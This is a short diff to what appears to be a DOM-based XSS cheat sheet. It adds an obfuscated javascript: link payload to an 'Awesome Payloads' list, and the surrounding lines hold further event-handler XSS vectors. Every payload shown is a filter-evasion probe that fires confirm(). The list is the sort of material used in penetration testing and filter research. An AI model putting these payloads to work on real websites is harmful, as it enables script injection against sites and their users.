@@ -80,6 +80,7 @@ This comprehensive list of sinks and source is taken from [domxsswiki](https://g
 
 ### Awesome Payloads
 ```
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
 <d3/onmouseenter=[2].find(confirm)>z
 <details open ontoggle=confirm()>
